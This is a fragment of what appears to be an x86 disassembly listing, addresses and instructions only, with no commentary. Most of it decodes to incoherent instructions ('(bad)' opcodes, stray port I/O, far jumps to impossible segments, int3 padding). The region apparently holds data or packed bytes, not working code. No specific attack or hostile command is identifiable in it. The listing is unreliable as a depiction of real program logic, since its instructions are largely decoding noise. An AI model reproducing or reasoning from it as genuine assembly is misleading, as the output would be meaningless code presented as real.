  415230:	imul   esi,DWORD PTR [edx+0xd],0x7373632e
  415237:	gs push ebx
  415239:	sub    DWORD PTR ds:[eax],esp
  41523c:	inc    ecx
  41523d:	imul   ecx,DWORD PTR [edx],0x7679636f
  415243:	gs dec ebp
  415245:	cs gs inc ecx
  415248:	bound  esi,QWORD PTR [edi+0x72]
  41524b:	jo     0x4152ba
  41524d:	and    BYTE PTR [esi],ch
  41524f:	cs gs jbe 0x415273
  415253:	dec    ebp
  415254:	addr16 jae 0x4152bc
  415257:	and    BYTE PTR [ecx+eiz*2],ch
  41525a:	gs or  eax,0x652e6d6f
  415260:	gs jns 0x4152c8
  415263:	jbe    0x4152ca
  415265:	jo     0x415287
  415267:	jne    0x4152bc
  415269:	and    BYTE PTR [eax],ah
  41526b:	jae    0x4152c0
  41526d:	inc    ebx
  41526e:	and    BYTE PTR gs:[eax],ah
  415271:	and    ah,BYTE PTR [eax]
  415273:	and    bh,ch
  415275:	mov    eax,ds:0x6ed87deb
  41527a:	ja     0x415294
  41527c:	jb     0x41522f
  41527e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41527f:	sbb    eax,0x27cccccc
  415284:	inc    ecx
  415285:	int3   
  415286:	int3   
  415287:	(bad)  [edi+0xcccccc]
	...
  415295:	pop    es
  415296:	push   ds
  415297:	xlat   BYTE PTR ds:[ebx]
  415298:	add    dl,dl
  41529a:	xchg   esp,eax
  41529b:	push   0x46
  41529d:	adc    dh,BYTE PTR [ebx+0x60]
  4152a0:	shr    eax,0xd4
  4152a3:	mov    eax,0xe47f3ae8
  4152a8:	inc    ebx
  4152a9:	push   0x36
  4152ab:	jl     0x4152a6
  4152ad:	lea    ecx,[ebp-0x72727273]
  4152b3:	lea    ecx,[ebp+0x6775758d]
  4152b9:	aaa    
  4152ba:	xchg   DWORD PTR [edi],edx
  4152bc:	jne    0x415333
  4152be:	jo     0x41533c
  4152c0:	(bad)  
  4152c1:	xchg   ecx,eax
  4152c2:	pop    esp
  4152c3:	out    0x4,al
  4152c5:	in     al,dx
  4152c6:	xchg   edi,eax
  4152c7:	push   esp
  4152c8:	fiadd  DWORD PTR [ecx-0x380b5874]
  4152ce:	data16 sti 
  4152d0:	dec    eax
  4152d1:	call   0x377e:0x8a326394
  4152d8:	out    dx,eax
  4152d9:	fadd   DWORD PTR [eax+0x7c]
  4152dc:	fisttp WORD PTR [edx+0x755b25b3]
  4152e2:	jne    0x415310
  4152e4:	adc    dh,BYTE PTR [ebp+0x75]
  4152e7:	lds    esp,FWORD PTR [edx-0x71]
  4152ea:	jne    0x4152ec
  4152ec:	lea    ecx,[ebx-0x4ccc63f]
  4152f2:	ins    BYTE PTR es:[edi],dx
  4152f3:	(bad)  
  4152f4:	retf   0xd776
  4152f7:	and    BYTE PTR [ebx-0x6a9f35db],bl
  4152fd:	inc    ecx
  4152fe:	rcl    BYTE PTR [esi-0x45],cl
  415301:	mov    al,ds:0x7fb6
  415306:	add    BYTE PTR [edi],cl
  415308:	nop
  415309:	push   0xffffffa6
  41530b:	and    BYTE PTR [ebx-0x5b49a7e2],0x7c
  415312:	iret   
  415313:	pop    es
  415314:	jle    0x4152d1
  415316:	mov    ecx,0x2c8de9e8
  41531b:	out    dx,al
  41531c:	mov    DWORD PTR [edx+0x31],ebx
  41531f:	inc    edi
  415320:	(bad)  
  415321:	jg     0x415316
  415323:	inc    esi
  415324:	add    BYTE PTR [eax],al
  415326:	pop    ebx
  415327:	sub    al,0x42
	...
  415335:	fmul   QWORD PTR [ebp-0x54]
  415338:	call   0xe92a3c25
  41533d:	call   0x12a3c2a
  415342:	add    bh,al
  415344:	adc    eax,0xad08e8ef
  415349:	(bad)  
  41534b:	cmp    BYTE PTR [esi],dh
  41534d:	in     al,dx
  41534e:	gs pop ebp
  415350:	or     al,0x39
  415352:	mov    cr4,eax
  415355:	inc    ebx
  415356:	aaa    
  415357:	pop    ecx
  415358:	sbb    DWORD PTR [esi],esi
  41535a:	adc    eax,0x68fc0000
  41535f:	add    BYTE PTR [eax],al
  415361:	adc    al,0x47
  415363:	add    BYTE PTR [eax],al
  415365:	mov    DWORD PTR [edi],ebp
  415367:	stc    
  415368:	jbe    0x415386
  41536a:	repz retw 
  41536d:	sub    esi,esp
  41536f:	push   edi
  415370:	(bad)
  415373:	inc    edx
  415374:	jb     0x4153c1
  415376:	mov    cl,0xaa
  415378:	dec    ecx
  415379:	pushw  cs
  41537b:	jl     0x41537a
  41537d:	add    BYTE PTR [eax],al
  41537f:	(bad)  
  415380:	shr    DWORD PTR [ebx+0xc1],cl
  415386:	sbb    al,0x4c
  415388:	int3   
  415389:	mov    ebx,ebx
  41538b:	adc    al,0xad
  41538d:	pop    eax
  41538e:	add    al,0x16
  415390:	mov    ds:0x972489a4,al
  415395:	sub    eax,0x6003186
  41539a:	mov    BYTE PTR [ecx-0x2e],ch
  41539d:	pop    esp
  41539e:	push   edx
  41539f:	xlat   BYTE PTR ds:[ebx]
  4153a0:	ins    BYTE PTR es:[edi],dx
  4153a1:	xor    eax,0x67e2b65
  4153a6:	pop    esi
  4153a7:	add    al,0xf1
  4153a9:	add    BYTE PTR [eax],al
  4153ab:	mov    edx,0x2f
  4153b0:	(bad)  
  4153b1:	(bad)  
  4153b2:	(bad)  
  4153b3:	(bad)  
  4153b4:	(bad)  
  4153b5:	(bad)  
  4153b6:	(bad)  
  4153b7:	(bad)  
  4153b8:	(bad)  
  4153b9:	mov    esi,0x6915
	...
  4153c6:	add    al,bh
  4153c8:	sbb    ecx,ebp
  4153ca:	mov    edi,0xf93450df
  4153cf:	arpl   WORD PTR [edx+0x1d],bx
  4153d2:	and    ah,al
  4153d4:	push   ecx
  4153d5:	push   es
  4153d6:	jge    0x4153a7
  4153d8:	mov    esp,0xb77e78ac
  4153dd:	and    eax,0xb8000091
  4153e2:	shr    DWORD PTR [edi-0x144bbfa2],0xd7
  4153e9:	fadd   st(6),st
  4153eb:	pop    ebp
  4153ec:	xor    dh,BYTE PTR [eax]
  4153ee:	ror    bl,0x6c
  4153f1:	stos   BYTE PTR es:[edi],al
  4153f2:	sbb    BYTE PTR [ecx+0xf1db56e],dl
  4153f8:	mov    gs,WORD PTR [ebp+ecx*2+0x36ee63]
  4153ff:	add    bl,dl
  415401:	std    
  415402:	hlt    
  415403:	add    BYTE PTR [eax],al
  415405:	js     0x415425
  415407:	sbb    al,0x0
  415409:	lea    edx,[edi]
  41540b:	dec    edi
  41540c:	push   ss
  41540d:	test   eax,0x99df6812
  415412:	add    al,0xbc
  415414:	sahf   
  415415:	cmc    
  415416:	(bad)  [edi+edi*4]
  415419:	dec    esp
  41541a:	pop    eax
  41541b:	daa    
  41541c:	pop    ebx
  41541d:	or     al,0x4c
  41541f:	sub    cl,ch
  415421:	scas   al,BYTE PTR es:[edi]
  415422:	lea    ecx,[ebp-0x721a0573]
  415428:	lea    ebx,[esi+eiz*2]
  41542b:	lea    ecx,[ebp+0x6a6a6a8d]
  415431:	push   0x6a
  415433:	push   0x6a
  415435:	push   0x6a
  415437:	mov    al,ds:0x1ae77523
  41543c:	jmp    0xae11311d
  415441:	ret    0xf41c
  415444:	or     BYTE PTR [ebp+edi*1+0x12],bh
  415448:	ds loopne 0x415476
  41544b:	and    BYTE PTR [esi+0x3333c7bf],ch
  415451:	xor    esi,DWORD PTR [ebx]
  415453:	xor    esi,DWORD PTR [ebx]
  415455:	xor    esi,DWORD PTR [ebx]
  415457:	xor    eax,DWORD PTR [eax]
  415459:	add    BYTE PTR [ebx+0x9e62f2],cl
  41545f:	add    BYTE PTR [ecx],ch
  415461:	mov    cl,0x23
  415463:	rcr    edx,1
  415465:	add    eax,0x2d600048
  41546a:	push   edi
  41546b:	adc    al,0xf4
  41546d:	inc    ecx
  41546e:	in     al,dx
  41546f:	into   
  415470:	mov    BYTE PTR es:[esp+esi*4+0xb],ah
  415475:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  415477:	cmp    dh,0xf4
  41547a:	sub    al,0xa0
  41547c:	mov    dh,0xeb
  41547e:	dec    esi
  41547f:	out    0x9e,eax
  415481:	jbe    0x4154ce
  415483:	add    BYTE PTR [eax],al
  415485:	mov    bl,0xcf
  415487:	add    BYTE PTR [eax],al
  415489:	aas    
  41548a:	outs   dx,BYTE PTR ds:[esi]
  41548b:	add    DWORD PTR [eax],eax
  41548d:	int3   
  41548e:	jbe    0x415499
  415490:	sti    
  415491:	add    DWORD PTR ds:0xde408d7f,esi
  415497:	mov    ds,WORD PTR [ecx-0x1fdc8ec5]
  41549d:	repnz xor al,0x3f
  4154a0:	xor    eax,0xda073247
  4154a5:	stos   DWORD PTR es:[edi],eax
  4154a6:	int3   
  4154a7:	int3   
  4154a8:	int3   
  4154a9:	mov    ds:0xdfca86f2,eax
  4154ae:	mov    eax,ds:0x959d6213
  4154b3:	cwde   
  4154b4:	imul   ebp,DWORD PTR ds:0x4b9e7d7b,0xfffffff2
  4154bb:	cwde   
  4154bc:	imul   ebp,DWORD PTR [esi],0x5b87a189
  4154c2:	sub    esi,DWORD PTR [esi-0x3333150d]
  4154c8:	mov    ebx,0xccccf405
  4154cd:	int3   
  4154ce:	int3   
  4154cf:	int3   
  4154d0:	int3   
  4154d1:	int3   
  4154d2:	int3   
  4154d3:	int3   
  4154d4:	int3   
  4154d5:	int3   
  4154d6:	int3   
  4154d7:	jae    0x415537
  4154d9:	sbb    al,BYTE PTR [eax]
	...
  4154e3:	(bad)  
  4154e4:	push   DWORD PTR [edx+0x5f]
  4154e7:	(bad)  
  4154e8:	mov    dl,0xba
  4154ea:	(bad)  
  4154eb:	dec    esi
  4154ec:	fwait
  4154ed:	xor    ah,ah
  4154ef:	pop    ebx
  4154f0:	stos   DWORD PTR es:[edi],eax
  4154f1:	xor    ecx,eax
  4154f3:	aad    0x9d
  4154f5:	std    
  4154f6:	sub    al,0x29
  4154f8:	xchg   ch,dl
  4154fa:	(bad)  
  4154fb:	test   DWORD PTR [edx],edx
  4154fd:	(bad)  
  4154fe:	call   FWORD PTR [eax]
  415500:	loopne 0x415501
  415502:	jmp    DWORD PTR [eax]
  415504:	cmp    edi,edi
  415506:	call   FWORD PTR [esi+0x2741982]
  41550c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41550d:	xor    eax,0x1e6d7f0a
  415512:	std    
  415513:	xor    BYTE PTR [ebx+0x6b],dl
  415516:	ror    DWORD PTR [ebp-0x1700a185],0x5f
  41551d:	popa   
  41551e:	sahf   
  41551f:	inc    DWORD PTR [eax]
  415521:	lods   eax,DWORD PTR ds:[esi]
  415522:	inc    ecx
  415523:	mul    al
  415525:	add    BYTE PTR [eax],al
  415527:	add    BYTE PTR [eax+0x700cbfef],bh
  41552d:	inc    ecx
  41552e:	pop    ds
  41552f:	xlat   BYTE PTR ds:[ebx]
  415530:	lds    esp,FWORD PTR [ecx-0x43]
  415533:	fs mov ah,0x16
  415536:	out    dx,al
  415537:	jns    0x41553e
  415539:	pop    ss
  41553a:	aad    0x54
  41553c:	pop    ds
  41553d:	lds    edi,FWORD PTR [edx+0x2d]
  415540:	xchg   dl,dl
  415542:	leave  
  415543:	in     eax,dx
  415544:	fwait
  415545:	mov    edi,0x69a18d9a
  41554a:	int    0x0
  41554c:	add    BYTE PTR [edx+0x30],ch
  41554f:	add    BYTE PTR [eax],al
  415551:	add    BYTE PTR [ebp-0x72727273],cl
  415557:	lea    ecx,[ebp+0x699c8d8d]
  41555d:	mov    dl,0xff
  41555f:	(bad)  
  415560:	(bad)  
  415561:	(bad)  
  415562:	(bad)  
  415563:	(bad)  
  415564:	(bad)  
  415565:	(bad)  
  415566:	jmp    DWORD PTR [esp]
  415569:	cmc    
  41556a:	add    DWORD PTR [edi],ebp
  41556c:	mov    ch,0x11
  41556e:	fst    DWORD PTR [ebp+0x12a9d080]
  415574:	sbb    bh,0x52
  415577:	xor    DWORD PTR [ebx-0x28],edi
  41557a:	pop    ds
  41557b:	or     dl,cl
  41557d:	rcl    ebp,cl
  41557f:	add    ebp,ebp
  415581:	and    al,0x24
  415583:	xor    eax,0x93dfed43
  415588:	jo     0x415544
  41558a:	out    0x7e,eax
  41558c:	shl    BYTE PTR [ebx+eiz*1-0x5180d37f],1
  415593:	jae    0x415576
  415595:	lea    edi,[edx+0x78cb788c]
  41559b:	ror    al,0x76
  41559e:	pop    ecx
  41559f:	or     esp,DWORD PTR [esp]
  4155a2:	(bad)  
  4155a3:	into   
  4155a4:	data16 and al,0x24
  4155a7:	sar    BYTE PTR [eax+0xb00245e],cl
  4155ad:	mov    bh,0xb2
  4155af:	dec    edx
  4155b0:	sbb    ebp,DWORD PTR [edi]
  4155b2:	fnstcw WORD PTR [edx-0x2d]
  4155b5:	push   edx
  4155b6:	push   edi
  4155b7:	add    al,0x2b
  4155b9:	jb     0x4155e7
  4155bb:	clc    
  4155bc:	jne    0x4155b5
  4155be:	sbb    BYTE PTR [ebx],bh
  4155c0:	jnp    0x41558c
  4155c2:	pop    ecx
  4155c3:	fadd   QWORD PTR [eax]
  4155c5:	add    BYTE PTR [eax],al
  4155c7:	inc    eax
  4155c8:	outs   dx,BYTE PTR ds:[esi]
  4155c9:	add    BYTE PTR [eax],al
  4155cb:	sti    
  4155cc:	mov    es,WORD PTR [eax]
  4155ce:	add    BYTE PTR [eax],al
  4155d0:	mov    DWORD PTR [ecx-0x76767677],ecx
  4155d6:	mov    DWORD PTR [ecx-0x3ca25677],ecx
  4155dc:	sub    esp,DWORD PTR [ebx+0x621f7c75]
  4155e2:	ror    DWORD PTR [eax+0x5e],1
  4155e5:	(bad)  
  4155e7:	mov    ebx,0x90c6d686
  4155ec:	pop    esi
  4155ed:	pop    edi
  4155ee:	fwait
  4155ef:	call   0x4545:0x45454571
  4155f6:	inc    ebp
  4155f7:	inc    ebp
  4155f8:	inc    ebp
  4155f9:	inc    ebp
  4155fa:	add    BYTE PTR [eax],al
  4155fc:	(bad)  
  4155fd:	stc    
  4155fe:	jns    0x415624
  415600:	add    BYTE PTR [eax],al
  415602:	iret   
  415603:	es stos DWORD PTR es:[edi],eax
  415605:	cmp    DWORD PTR [esi+eiz*8],esi
  415608:	cld    
  415609:	cmp    al,0xe5
  41560b:	pop    edx
  41560c:	dec    esi
  41560d:	cdq    
  41560e:	mov    esi,0x99089c34
  415613:	out    0xfd,al
  415615:	daa    
  415616:	subps  xmm5,xmm2
  415619:	sub    BYTE PTR [eiz*2+0x41886dd5],dl
  415620:	popa   
  415621:	(bad)  
  415622:	mov    edx,ss
  415624:	push   0xee9d0000
  415629:	add    BYTE PTR [eax],al
  41562b:	jns    0x415693
  41562d:	mov    eax,ds:0xad7cff00
  415632:	in     eax,0x18
  415634:	pop    ecx
  415635:	scas   eax,DWORD PTR es:[edi]
  415636:	in     eax,0x22
  415638:	cmp    ebp,DWORD PTR [edi+0x6f]
  41563b:	scas   eax,DWORD PTR es:[edi]
  41563c:	and    BYTE PTR [ebp+0x1ee4e3d],al
  415642:	aaa    
  415643:	sub    cl,BYTE PTR [edx]
  415645:	ss scas al,BYTE PTR es:[edi]
  415647:	mov    eax,0x1dffffff
  41564c:	pop    ebx
  41564d:	leave  
  41564e:	xor    DWORD PTR [esi-0x39],edx
  415651:	gs ins BYTE PTR es:[edi],dx
  415653:	gs cs push edi
  415656:	cs push ebx
  415658:	cmp    ah,BYTE PTR [ebx+0x2e]
  41565b:	dec    esp
  41565c:	outs   dx,BYTE PTR ds:[esi]
  41565d:	jbe    0x4156d4
  41565f:	jbe    0x4156c6
  415661:	push   ebx
  415662:	jae    0x4156d6
  415664:	gs cs je 0x4156d1
  415668:	and    BYTE PTR [eax],ah
  41566a:	outs   dx,BYTE PTR cs:[esi]
  41566c:	je     0x4156de
  41566e:	imul   esp,DWORD PTR gs:[ebp+0x6d],0x3d652965
  415676:	jb     0x4156db
  415678:	outs   dx,DWORD PTR ds:[esi]
  415679:	bound  ebp,QWORD PTR [edi+0x65]
  41567c:	and    BYTE PTR cs:[edx+0x72],dh
  415680:	push   ebx
  415681:	arpl   WORD PTR [ebp+ecx*2+0x65],sp
  415685:	popa   
  415686:	and    ah,BYTE PTR [ebx+0x74]
  415689:	inc    esp
  41568a:	arpl   WORD PTR cs:[esi+0x65],si
  41568e:	ds ins DWORD PTR es:[edi],dx
  415690:	ins    DWORD PTR es:[edi],dx
  415691:	arpl   WORD PTR [ebx+0x65],sp
  415694:	outs   dx,DWORD PTR ds:[esi]
  415695:	imul   ecx,DWORD PTR [edx],0x94412067
  41569b:	xchg   ebp,eax
  41569c:	jbe    0x415672
  41569e:	fiadd  DWORD PTR [esi-0x6f690407]
  4156a4:	loop   0x41566c
  4156a6:	xor    cl,BYTE PTR [edi+0x41d1f497]
  4156ac:	retf   
  4156ad:	and    BYTE PTR [edx],dl
  4156af:	jle    0x415729
  4156b1:	(bad)  
  4156b2:	jmp    DWORD PTR [ebp-0x6bf3]
  4156b8:	inc    DWORD PTR [eax]
	...
  4156c2:	vpcmpgtw xmm1,xmm0,XMMWORD PTR [ebx-0x74747475]
  4156ca:	mov    ecx,DWORD PTR [ebx+0x8b8b]
  4156d0:	fnstenv [edx]
  4156d2:	xor    BYTE PTR [edx-0x3f],dl
  4156d5:	mov    ds:0x1eb10a,al
  4156da:	lahf   
  4156db:	xchg   ebx,eax
  4156dc:	xlat   BYTE PTR ds:[ebx]
  4156dd:	popa   
  4156de:	pop    eax
  4156df:	xchg   edx,eax
  4156e0:	cmp    DWORD PTR ds:0x890c8f3,edi
  4156e6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4156e8:	add    BYTE PTR [eax],al
  4156ea:	inc    esi
  4156eb:	rol    DWORD PTR [eax],cl
  4156ed:	add    al,bh
  4156ef:	cli    
  4156f0:	add    BYTE PTR [eax],al
  4156f2:	test   DWORD PTR [edx-0x43],esi
  4156f5:	xlat   BYTE PTR ds:[ebx]
  4156f6:	jb     0x415746
  4156f8:	int    0x99
  4156fa:	in     eax,0x37
  4156fc:	inc    edi
  4156fd:	mov    dh,0xd5
  4156ff:	xor    ah,BYTE PTR [ebp+0x4b]
  415702:	pop    edx
  415703:	fsubr  QWORD PTR [edx-0x37]
  415706:	pop    edi
  415707:	rcl    BYTE PTR [esp+edx*8],1
  41570a:	add    al,ch
  41570c:	stc    
  41570d:	imul   esi,DWORD PTR [edx],0xe8e8e806
  415713:	test   BYTE PTR [ebx],ch
  415715:	jmp    0x3ee558ba
  41571a:	cmp    al,0x4c
  41571c:	pop    ebx
  41571d:	and    eax,0xdadb0745
  415722:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415723:	cli    
  415724:	mov    edi,gs
  415726:	xchg   BYTE PTR [eax+0x79],dh
  415729:	popf   
  41572a:	xor    DWORD PTR [eax-0x69744e5d],edi
  415730:	or     ch,ch
  415732:	jge    0x4156c0
  415734:	mov    cl,0xbd
  415736:	call   0xe92e8f23
  41573b:	call   0x89cae128
  415740:	mov    DWORD PTR [ecx-0x76767677],ecx
  415746:	(bad)  
  415747:	sar    BYTE PTR [ecx-0x72727273],1
  41574d:	lea    ecx,[ebp-0x74727273]
  415753:	mov    ebp,ebx
  415755:	ss jno 0x4157be
  415758:	mov    ebx,0xf3d3f4f7
  41575d:	ret    0x1048
  415760:	jnp    0x4156ee
  415762:	sbb    al,0xbe
  415764:	jg     0x415730
  415766:	jno    0x415717
  415768:	cmp    BYTE PTR [edx-0x7474c8d0],al
  41576e:	rcr    DWORD PTR ds:[ecx],0xc2
  415772:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415773:	int3   
  415774:	jmp    0x4157a3
  415776:	dec    ebp
  415777:	cdq    
  415778:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415779:	fsub   DWORD PTR [eax+0x7df045e6]
  41577f:	xor    ebx,esp
  415781:	pop    ebp
  415782:	fsubr  DWORD PTR [edx+0x26]
  415785:	lahf   
  415786:	add    BYTE PTR [esi-0x74b96fa0],ch
  41578c:	mov    esp,DWORD PTR [edx-0x72]
  41578f:	inc    esp
  415790:	mov    ecx,DWORD PTR [ebx-0x7401be2b]
  415796:	call   FWORD PTR [esi+0x22]
  415799:	pop    ebx
  41579a:	fsub   DWORD PTR [ebx]
  41579c:	dec    ebx
  41579d:	out    dx,eax
  41579e:	or     DWORD PTR [esi],ecx
  4157a0:	pop    esi
  4157a1:	mov    eax,0xd9e47040
  4157a6:	in     eax,0xb4
  4157a8:	aad    0xd6
  4157aa:	iret   
  4157ab:	mov    dl,0xe2
  4157ad:	scas   eax,DWORD PTR es:[edi]
  4157ae:	icebp  
  4157af:	(bad)  
  4157b0:	(bad)  
  4157b1:	jmp    DWORD PTR [ebx]
  4157b3:	mov    bh,bh
  4157b5:	dec    DWORD PTR [ecx-0x85]
	...
  4157c3:	add    BYTE PTR [edx-0x16a47f40],dl
  4157c9:	cmp    eax,0x134fcc30
  4157ce:	int3   
  4157cf:	cmc    
  4157d0:	shr    BYTE PTR ds:0x31d4f0ba,1
  4157d6:	aad    0xef
  4157d8:	(bad)  
  4157d9:	sti    
  4157da:	mov    ds:0x8585859f,al
  4157df:	test   DWORD PTR [ebp-0x7a7a7a7b],eax
  4157e5:	(bad)  
  4157e6:	jmp    FWORD PTR ds:0xff6a3dbb
  4157ec:	call   FWORD PTR [edi]
  4157ee:	in     al,dx
  4157ef:	vpminub ymm6,ymm5,YMMWORD PTR ds:0x501620db
  4157f7:	scas   eax,DWORD PTR es:[edi]
  4157f8:	pop    ecx
  4157f9:	in     eax,dx
  4157fa:	mov    ebx,0xdfa2683
  4157ff:	or     al,0xa3
  415801:	inc    ecx
  415802:	push   ds
  415803:	call   0xd655345f
  415808:	out    dx,al
  415809:	test   ch,0xa5
  41580c:	jmp    0x57ff:0xffe536ff
  415813:	into   
  415814:	(bad)  
  415815:	jmp    DWORD PTR [ebx+0xff76c7]
  41581b:	xchg   esp,eax
  41581c:	push   esi
  41581d:	xor    al,0x1c
  41581f:	into   
  415820:	sar    BYTE PTR [eax],cl
  415822:	mov    ebx,0x319be53c
  415827:	ret    
  415828:	push   0x5c
  41582a:	bound  eax,QWORD PTR [esi+0x3b51a038]
  415830:	add    dl,bl
  415832:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415833:	add    BYTE PTR [eax],al
  415835:	add    BYTE PTR [ecx+0xe],ch
  415838:	sub    eax,DWORD PTR [ebx]
  41583a:	ror    DWORD PTR [eax],cl
  41583c:	cmp    DWORD PTR [esi-0x2b],ebx
  41583f:	adc    BYTE PTR [esi+ecx*8+0x2c7a5503],bl
  415846:	push   edi
  415847:	jb     0x41583f
  415849:	ss xor BYTE PTR gs:0x57e99077,ah
  415851:	stos   DWORD PTR es:[edi],eax
  415852:	xchg   ebp,eax
  415853:	add    BYTE PTR [eax],al
  415855:	inc    ebx
  415856:	xchg   esp,eax
  415857:	push   ebx
	...
  415864:	xor    dl,BYTE PTR [esi-0x13]
	...
  41586f:	add    BYTE PTR [ebx-0x38bada75],cl
  415875:	cdq    
  415876:	mov    ds:0x8f064a8a,al
  41587b:	jl     0x415831
  41587d:	sar    DWORD PTR [edx+0x4f],1
  415880:	(bad)  
  415881:	pushf  
  415882:	mov    BYTE PTR [edi+esi*1+0x7d33764d],ah
  415889:	out    0x8b,al
  41588b:	mov    ebp,DWORD PTR [esi]
  41588d:	and    ecx,DWORD PTR [ebx-0x74f7ed75]
  415893:	mov    ebp,DWORD PTR [esi+0x1a]
  415896:	lods   al,BYTE PTR ds:[esi]
  415897:	push   esi
  415898:	hlt    
  415899:	push   edx
  41589a:	retf   0xe459
  41589d:	jle    0x4158ad
  41589f:	adc    eax,0x2301a643
  4158a4:	es js  0x4158d6
  4158a7:	sbb    eax,0xe6b8a568
  4158ac:	mov    ecx,DWORD PTR [ebx+0x2262707c]
  4158b2:	inc    ecx
  4158b3:	push   ebx
  4158b4:	jae    0x4158e4
  4158b6:	ja     0x415928
  4158b8:	ds inc ecx
  4158ba:	dec    esp
  4158bb:	imul   ebp,DWORD PTR [esi],0x6f745365
  4158c1:	dec    ebp
  4158c2:	imul   edi,DWORD PTR gs:[esi],0x2e703c6e
  4158c9:	push   ebx
  4158ca:	cs popa 
  4158cc:	outs   dx,DWORD PTR ds:[esi]
  4158cd:	gs ins DWORD PTR es:[edi],dx
  4158cf:	outs   dx,BYTE PTR ds:[esi]
  4158d0:	jns    0x415944
  4158d2:	inc    ecx
  4158d3:	jbe    0x415919
  4158d5:	jae    0x4158f7
  4158d7:	jbe    0x41593f
  4158d9:	jae    0x41594a
  4158db:	cs ds je 0x415955
  4158df:	and    BYTE PTR gs:[edi+ebp*2+0x65],dh
  4158e4:	cs popa 
  4158e6:	bound  esi,QWORD PTR [ebp+0x20]
  4158e9:	je     0x415950
  4158eb:	push   0x536e2c6e
  4158f0:	and    BYTE PTR [ecx+0x65],ch
  4158f3:	jbe    0x415961
  4158f5:	bound  edx,QWORD PTR [ebx+0x65]
  4158f8:	cs ins DWORD PTR es:[edi],dx
  4158fa:	imul   esi,DWORD PTR [ebx+0x67],0x2073746f
  415901:	ins    DWORD PTR es:[edi],dx
  415902:	ds gs ds sub al,0x6e
  415907:	jb     0x41596e
  415909:	jb     0x415980
  41590b:	and    BYTE PTR [esi],ch
  41590d:	pusha  
  41590e:	push   ebx
  41590f:	or     DWORD PTR [ebx+0x143f8b8b],0xffffffea
  415916:	add    BYTE PTR [esi+0x44],0xe0
  41591a:	dec    esi
  41591b:	push   eax
  41591c:	xor    al,0x74
  41591e:	jecxz  0x41592a
  415920:	pop    edi
  415921:	lds    eax,FWORD PTR [ebx]
  415923:	xchg   ebx,eax
  415924:	dec    edx
  415925:	outs   dx,DWORD PTR ds:[esi]
  415926:	sbb    DWORD PTR [esi],ebp
  415928:	dec    ebx
  415929:	pop    edx
  41592a:	xor    eax,0x9fd71b55
  41592f:	fcomp  QWORD PTR [ebp+0x74cb5a5e]
  415935:	mov    bh,0x8b
  415937:	mov    eax,DWORD PTR [esi+0x3]
  41593a:	mov    ecx,DWORD PTR [ebx+0x7474748b]
  415940:	je     0x4159b6
  415942:	je     0x4159b8
  415944:	je     0x4159ba
  415946:	pop    esp
  415947:	adc    al,bh
	...
  415951:	add    BYTE PTR [eax],al
  415953:	add    BYTE PTR [ebx-0x19],bl
  415956:	repz or al,0x73
  415959:	shl    BYTE PTR [esi+0x6ec950ae],0x7b
  415960:	adc    ebp,DWORD PTR [edx+0x7ac91755]
  415966:	push   esp
  415967:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415968:	arpl   WORD PTR [ebx+ecx*4+0x30],bx
  41596c:	add    BYTE PTR [eax],al
  41596e:	xor    BYTE PTR [ebp+ebp*1-0x6],bh
  415972:	mov    eax,gs:0xa4b94710
  415978:	jp     0x4159d2
  41597a:	mov    ch,0xda
  41597c:	fadd   QWORD PTR [ebx+ebp*4-0x50502953]
  415983:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415984:	xor    al,dl
  415986:	add    DWORD PTR [esi+0x50c543],eax
  41598c:	add    BYTE PTR [ecx+0xa67e],al
  415992:	jmp    0x4159dc
  415994:	js     0x415996
  415996:	jmp    FWORD PTR [edi-0x6f]
  415999:	and    al,BYTE PTR [eax+0x4606223c]
  41599f:	mov    dh,0x32
  4159a1:	(bad)  [ebx+0x2e1e15f]
  4159a7:	fwait
  4159a8:	and    DWORD PTR [esi+0x6c],ebp
  4159ab:	xor    eax,0xff626a67
  4159b0:	(bad)  
  4159b1:	push   esi
  4159b3:	mov    cl,0xff
  4159b5:	jmp    FWORD PTR [edx]
  4159b7:	out    dx,al
  4159b8:	(bad)  
  4159b9:	(bad)  
  4159ba:	inc    DWORD PTR [eax]
	...
  4159c4:	push   eax
  4159c5:	outs   dx,DWORD PTR ds:[esi]
  4159c6:	adc    al,BYTE PTR [edi+ebx*1]
  4159c9:	outs   dx,BYTE PTR ds:[esi]
  4159ca:	pop    edi
  4159cb:	jle    0x4159c6
  4159cd:	dec    ebx
  4159ce:	mov    edi,0x83aed135
  4159d3:	sub    ah,BYTE PTR ds:[edx-0x146b16da]
  4159da:	out    dx,al
  4159db:	push   ebp
	...
  4159e4:	add    BYTE PTR [eax],al
  4159e6:	add    BYTE PTR [ecx],bl
  4159e8:	ins    DWORD PTR es:[edi],dx
  4159e9:	xor    DWORD PTR [eax+eax*1+0x0],0x1e54e52e
  4159f1:	sub    edi,edi
  4159f3:	out    dx,eax
  4159f4:	mov    esi,0x98218c5f
  4159f9:	jl     0x4159fa
  4159fb:	jp     0x415985
  4159fd:	test   al,0x1e
  415a00:	fild   QWORD PTR [edi]
  415a02:	or     al,0x92
  415a04:	cmp    BYTE PTR [edx-0x43],dh
  415a07:	sti    
  415a08:	or     ebp,esp
  415a0a:	ret    0x20dd
  415a0d:	sub    eax,0x9195
  415a12:	or     cl,BYTE PTR [eax+eax*1+0x0]
  415a16:	lea    eax,[edi]
  415a18:	aaa    
  415a19:	add    BYTE PTR [ebp-0x7dc4dc4],cl
  415a1f:	add    eax,0x69c4bb0c
  415a24:	rcl    DWORD PTR [edi+0x43],0x81
  415a28:	jae    0x4159c3
  415a2a:	fmul   DWORD PTR [eax-0x54]
  415a2d:	loop   0x415aa5
  415a2f:	enter  0x37ba,0x73
  415a33:	lea    ecx,[ebp+0x12a5e78d]
  415a39:	jmp    0xd1e6:0x92eac983
  415a40:	stos   DWORD PTR es:[edi],eax
  415a41:	sti    
  415a42:	test   al,0xf9
  415a44:	add    eax,0xbcf14d94
  415a49:	jo     0x415aa0
  415a4b:	lods   eax,DWORD PTR ds:[esi]
  415a4c:	dec    eax
  415a4d:	add    al,0x9a
  415a4f:	pushf  
